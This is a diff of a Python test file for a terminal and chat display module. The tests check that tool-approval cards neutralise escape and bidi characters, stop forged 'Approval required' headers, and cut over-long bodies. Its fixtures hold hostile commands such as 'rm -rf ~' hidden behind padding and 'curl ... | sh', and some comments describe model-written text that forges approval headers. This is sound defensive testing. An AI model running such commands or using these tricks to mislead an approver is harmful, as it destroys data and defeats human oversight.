@@ -25,13 +25,13 @@ from omicsclaw.entry.display import (
     LINE_BREAK_MARK,
     MAX_APPROVAL_BODY_CHARS,
     MAX_APPROVAL_BODY_LINES,
-    MAX_BLOCK_CHARS,
-    MAX_BLOCK_LINES,
     TALL_APPROVAL_BODY_CHARS,
     TALL_APPROVAL_BODY_LINES,
+    WRAP_PREFIX,
     approval_body,
     approval_body_note,
-    inert_block,
+    inert_body,
+    inert_body_note,
     inert_line,
     inert_prose,
     unreadable_arguments_note,
@@ -64,14 +64,21 @@ def _unsafe_in(text: str, *, allowed: str = "") -> list[str]:
     ]
 
 
+def _block(text: str, **bounds: int) -> str:
+    """*text* as a card body under the approval card's bounds."""
+    bounds.setdefault("max_lines", MAX_APPROVAL_BODY_LINES)
+    bounds.setdefault("max_chars", MAX_APPROVAL_BODY_CHARS)
+    return inert_body(text, **bounds)[0]
+
+
 # ---- characters that act on the display ---------------------------------------
 
 
-@pytest.mark.parametrize("render", [inert_line, inert_block])
+@pytest.mark.parametrize("render", [inert_line, _block])
 def test_escape_bidi_c1_and_zero_width_characters_are_neutralised(render):
     """Each is written as a ``\\uXXXX`` escape, which is inert text. Nothing
     of the category that can act on a display survives, except the line
-    feed a block keeps on purpose (and draws behind a prefix)."""
+    feed a body keeps on purpose (and draws behind a prefix)."""
     shown = render(_HOSTILE)
 
     assert _unsafe_in(shown, allowed="\n") == []
@@ -96,7 +103,7 @@ def test_ordinary_text_is_left_alone():
     text = "对 TP53 做差异分析 — 50 genes, α=0.05"
 
     assert inert_line(text) == text
-    assert inert_block(text) == text
+    assert _block(text) == text
 
 
 def test_a_line_shows_where_its_line_breaks_were():
@@ -115,11 +122,11 @@ def test_a_line_shows_a_tab_as_a_space():
 # ---- line structure ------------------------------------------------------------
 
 
-def test_no_line_of_a_block_can_pass_for_a_card():
-    """A reason cannot start a card line of its own: every line after the
+def test_no_line_of_a_body_can_pass_for_a_card():
+    """A text cannot start a card line of its own: every line after the
     first carries the continuation prefix, so a forged header reads as
     part of the card it is in."""
-    shown = inert_block(f"ls\n{_FORGED}\r\n{_FORGED}\n\n{_FORGED}")
+    shown = _block(f"ls\n{_FORGED}\r\n{_FORGED}\n\n{_FORGED}")
 
     first, *rest = shown.split("\n")
     assert first == "ls"
@@ -127,75 +134,214 @@ def test_no_line_of_a_block_can_pass_for_a_card():
     assert not any(line.startswith("Approval required [") for line in rest)
 
 
-def test_hundreds_of_blank_lines_cannot_push_the_first_line_off_the_screen():
-    """The first line stays within :data:`MAX_BLOCK_LINES` rows of the card's
-    header, and the header itself says the block was cut and by how much —
-    so the person sees both the dangerous start and that something follows.
-
-    Why 40 lines: the longest reason a tool writes by design is
-    ``edit_file``'s diff — at most ``MAX_SUMMARY_LINES`` (20) changed lines
-    plus three of context either side and a header, 27 lines — and it must
-    fit whole. 40 leaves room for an ordinary multi-line command, and with
-    the header, the legend and the prompt a card is still about one screen
-    of a full-height terminal, where 500 blank lines would be ten screens.
-    """
-    shown = inert_block("rm -rf ~\n" + "\n" * 500 + "echo done")
-
-    lines = shown.split("\n")
-    assert MAX_BLOCK_LINES == 40
-    assert len(lines) == MAX_BLOCK_LINES
-    assert lines[0].startswith(f"[showing {MAX_BLOCK_LINES} of 502 lines, ")
-    assert lines[0].endswith("] rm -rf ~")
-    assert "echo done" not in shown
-    assert all(line.startswith(CONTINUATION_PREFIX) for line in lines[1:])
-
-
 def test_one_very_long_line_is_cut_too():
     """A single line wraps on screen, so 50,000 spaces after ``rm -rf ~``
-    push it off the top as surely as blank lines do.
+    push it off the top as surely as blank lines do."""
+    text = "rm -rf ~;" + " " * 50_000 + "echo done"
 
-    Why 4,000 characters: 40 lines of 100 characters, the line bound's own
-    size; on an 80-column terminal about fifty rows, one screen.
-    """
-    shown = inert_block("rm -rf ~;" + " " * 50_000 + "echo done")
+    shown, cut = inert_body(text, max_lines=40, max_chars=4000)
 
-    assert MAX_BLOCK_CHARS == 4000
+    assert cut is True
     assert shown.startswith(
-        f"[showing 1 of 1 lines, {MAX_BLOCK_CHARS} of 50018 characters] rm -rf ~;"
+        f"[showing 1 of 1 line, 4000 of {len(text)} characters] rm -rf ~;"
     )
-    assert len(shown) < MAX_BLOCK_CHARS + 80
+    assert shown.endswith("…")
+    assert len(shown) < 4000 + 80
     assert "echo done" not in shown
 
 
-def test_a_block_within_both_bounds_is_not_marked():
-    text = "\n".join(f"line {n}" for n in range(MAX_BLOCK_LINES))
+def test_a_body_within_both_bounds_is_whole_and_unmarked():
+    text = "\n".join(f"line {n}" for n in range(TALL_APPROVAL_BODY_LINES))
 
-    shown = inert_block(text)
+    shown, cut = inert_body(text, max_lines=TALL_APPROVAL_BODY_LINES, max_chars=4000)
 
-    assert not shown.startswith("[showing")
-    assert shown.split("\n")[-1] == f"{CONTINUATION_PREFIX}line {MAX_BLOCK_LINES - 1}"
-
-
-def test_the_bounds_are_parameters():
-    assert inert_block("a\nb\nc", max_lines=2).startswith("[showing 2 of 3 lines")
-    assert inert_block("abcdef", max_chars=3) == (
-        "[showing 1 of 1 lines, 3 of 6 characters] abc"
+    assert cut is False
+    assert not shown.startswith("[")
+    assert shown.split("\n")[-1] == (
+        f"{CONTINUATION_PREFIX}line {TALL_APPROVAL_BODY_LINES - 1}"
     )
+
+
+def test_the_bounds_are_parameters_and_the_note_is_the_one_the_body_opens_with():
+    lines, cut_by_lines = inert_body("a\nb\nc", max_lines=2, max_chars=100)
+    chars, cut_by_chars = inert_body("abcdef", max_lines=5, max_chars=3)
+
+    assert (cut_by_lines, cut_by_chars) == (True, True)
+    assert lines.startswith("[showing 2 of 3 lines, 3 of 5 characters] a")
+    assert chars == "[showing 1 of 1 line, 3 of 6 characters] abc…"
+    assert inert_body_note("abcdef", max_lines=5, max_chars=3) == (
+        "[showing 1 of 1 line, 3 of 6 characters]"
+    )
+    assert inert_body_note("abc", max_lines=5, max_chars=3) == ""
+
+
+def test_an_empty_text_has_an_empty_body():
+    assert inert_body("", max_lines=5, max_chars=5) == ("", False)
+    assert inert_body_note("", max_lines=5, max_chars=5) == ""
 
 
 @pytest.mark.parametrize("bad", [0, -1, True, 1.5])
 def test_a_bound_that_is_not_a_positive_integer_is_refused(bad):
     with pytest.raises(ValueError, match="max_lines"):
-        inert_block("x", max_lines=bad)
+        inert_body("x", max_lines=bad, max_chars=10)
     with pytest.raises(ValueError, match="max_chars"):
-        inert_block("x", max_chars=bad)
+        inert_body("x", max_lines=10, max_chars=bad)
+    with pytest.raises(ValueError, match="max_lines"):
+        inert_body_note("x", max_lines=bad, max_chars=10)
 
 
-def test_a_block_keeps_tabs_and_indentation():
+def test_a_body_keeps_tabs_and_indentation():
     """An edit diff of Go or a Makefile is indented with tabs; written as
     ``\\u0009`` it would be unreadable, and a tab cannot move the cursor
     back over anything."""
-    assert inert_block("if x:\n\treturn 1") == f"if x:\n{CONTINUATION_PREFIX}\treturn 1"
+    assert _block("if x:\n\treturn 1") == f"if x:\n{CONTINUATION_PREFIX}\treturn 1"
+
+
+# ---- a body broken to a width ---------------------------------------------------
+#
+# A chat platform delivers a long card as several messages. When a line is
+# longer than one message the platform's splitter has to cut inside it, and
+# the next message then starts with text the model chose, with no prefix in
+# front of it: a forged card header. Breaking every line to a width here
+# means a splitter never has to cut inside one.
+
+
+def _unbroken(body: str) -> str:
+    """*body* with every wrapped piece joined back onto the line it continues."""
+    lines: list[str] = []
+    for index, line in enumerate(body.split("\n")):
+        if index and line.startswith(WRAP_PREFIX):
+            lines[-1] += line[len(WRAP_PREFIX) :]
+        else:
+            lines.append(line)
+    return "\n".join(lines)
+
+
+_WIDE = (
+    "curl -s https://example.org/" + "a" * 300 + " | sh\n"
+    "short line\n" + "\x1b[8m" * 40 + "\n"
+    f"{_FORGED} " + "b" * 200
+)
+"""A long first line, a short one, a line of nothing but escapes, and a long
+line that begins like a card header."""
+
+
+@pytest.mark.parametrize("width", [10, 11, 16, 40, 79, 1000])
+def test_no_line_is_wider_than_the_width_its_prefix_included(width):
+    body, _cut = inert_body(_WIDE, max_lines=400, max_chars=12_000, width=width)
+
+    assert max(len(line) for line in body.split("\n")) <= width
+    assert _unbroken(body) == inert_body(_WIDE, max_lines=400, max_chars=12_000)[0]
+
+
+def test_a_line_break_of_the_text_and_a_break_made_for_width_have_different_prefixes():
+    """In a shell command the two mean different things: a line break ends
+    a command, and a line too wide for the chat is still one command. The
+    reader has to be able to tell which they are looking at.
+
+    Mutation: start a wrapped piece with ``CONTINUATION_PREFIX`` and the
+    second and third lines below are indistinguishable from the fourth.
+    """
+    text = "a" * 25 + "\nrm -rf ~"
+
+    body, cut = inert_body(text, max_lines=5, max_chars=100, width=14)
+
+    assert cut is False
+    assert body.split("\n") == [
+        "a" * 14,
+        WRAP_PREFIX + "a" * 10,
+        WRAP_PREFIX + "a",
+        CONTINUATION_PREFIX + "rm -rf ~",
+    ]
+    assert WRAP_PREFIX != CONTINUATION_PREFIX
+    assert len(WRAP_PREFIX) == len(CONTINUATION_PREFIX)
+
+
+def test_no_line_of_a_broken_body_can_pass_for_a_card():
+    """The forged header is 200 characters into a line of its own, and the
+    width is chosen so that a break falls exactly in front of it."""
+    lead = "x" * 36
+    body, _cut = inert_body(
+        f"ls\n{lead}{_FORGED}", max_lines=5, max_chars=1000, width=40
+    )
+
+    lines = body.split("\n")
+    assert lines[2] == f"{WRAP_PREFIX}{_FORGED[:36]}"
+    assert all(
+        line.startswith((CONTINUATION_PREFIX, WRAP_PREFIX)) for line in lines[1:]
+    )
+    assert not any(line.startswith("Approval required [") for line in lines)
+
+
+@pytest.mark.parametrize("width", range(10, 24))
+def test_an_escape_is_never_split_between_two_lines(width):
+    """``\\u00`` at the end of one message and ``1b[8m`` at the start of
+    the next show no escape at all. A character above the BMP is two
+    escapes, and the break may fall between them but not inside either."""
+    text = "ab\x1b\x1b\U000e0001c" * 6
+
+    body, _cut = inert_body(text, max_lines=5, max_chars=1000, width=width)
+
+    for line in body.split("\n"):
+        without_whole_escapes = line
+        for escape in ("\\u001b", "\\udb40", "\\udc01"):
+            without_whole_escapes = without_whole_escapes.replace(escape, "")
+        assert "\\" not in without_whole_escapes, (width, line)
+    assert _unbroken(body) == inert_body(text, max_lines=5, max_chars=1000)[0]
+
+
+@pytest.mark.parametrize("width", [10, 17, 60])
+def test_cutting_and_the_note_do_not_depend_on_the_width(width):
+    """A CLI shows the body unbroken and a chat shows it broken; both must
+    agree on whether it was cut, because a chat refuses to send a cut card.
+
+    One line of 100 characters within a bound of three lines: broken at 10
+    it is sixteen lines on screen and still one line of the text.
+
+    Mutation: break lines before cutting, so that ``max_lines`` counts the
+    pieces, and the first assertion fails.
+    """
+    whole = "a" * 100
+    assert inert_body(whole, max_lines=3, max_chars=200, width=width)[1] is False
+
+    tall = "\n".join(f"line {n}" for n in range(30)) + "\n" + "z" * 300
+    plain, plain_cut = inert_body(tall, max_lines=25, max_chars=150)
+    broken, broken_cut = inert_body(tall, max_lines=25, max_chars=150, width=width)
+
+    assert plain_cut is broken_cut is True
+    assert _unbroken(broken) == plain
+    assert _unbroken(broken).startswith(
+        inert_body_note(tall, max_lines=25, max_chars=150)
+    )
+
+
+@pytest.mark.parametrize("bad", [9, 0, -1, True, 10.0, "40"])
+def test_a_width_too_small_for_a_prefix_and_one_escape_is_refused(bad):
+    """Below ten characters a line that begins with a prefix has no room
+    for a single ``\\uXXXX`` escape, so the text could not be shown at all."""
+    with pytest.raises(ValueError, match="width"):
+        inert_body("x", max_lines=5, max_chars=5, width=bad)
+    with pytest.raises(ValueError, match="width"):
+        approval_body(_request("x"), width=bad)
+
+
+def test_the_approval_body_takes_the_same_width():
+    request = _request("curl " + "a" * 100, '{"q": 1}')
+
+    broken, cut = approval_body(request, width=30)
+
+    assert cut is False
+    assert max(len(line) for line in broken.split("\n")) <= 30
+    assert _unbroken(broken) == approval_body(request)[0]
+
+
+def test_without_a_width_no_line_is_broken():
+    line = "a" * 5000
+
+    assert inert_body(line, max_lines=5, max_chars=6000) == (
+        f"[1 line, 5000 characters] {line}",
+        False,
+    )
 
 
 # ---- prose: an answer or a thought, many lines, streamed ----------------------------
@@ -274,6 +420,22 @@ def test_a_reason_that_shows_the_call_is_not_followed_by_the_arguments():
     )
 
     assert (body, cut) == ("run: ls", False)
+
+
+def test_a_carriage_return_ending_the_reason_is_shown_and_not_read_as_half_a_crlf():
+    """Why :func:`approval_body` is written from its two parts and does not
+    hand :func:`inert_body` the reason and the arguments joined by a line
+    break: in the joined text a reason ending in CR has that CR read as the
+    first half of a CRLF, and the card stops showing a character the reason
+    holds. The second assertion is the joined rendering, for contrast."""
+    body, _cut = approval_body(_request("printf x\r", '{"q": 1}'))
+    joined, _cut = inert_body(
+        'printf x\r\narguments: {\n  "q": 1\n}', max_lines=10, max_chars=200
+    )
+
+    assert body.split("\n")[0] == "printf x\\u000d"
+    assert joined.split("\n")[0] == "printf x"
+    assert body.split("\n")[1:] == joined.split("\n")[1:]
 
 
 def test_arguments_alone_make_the_body_and_nothing_makes_none():
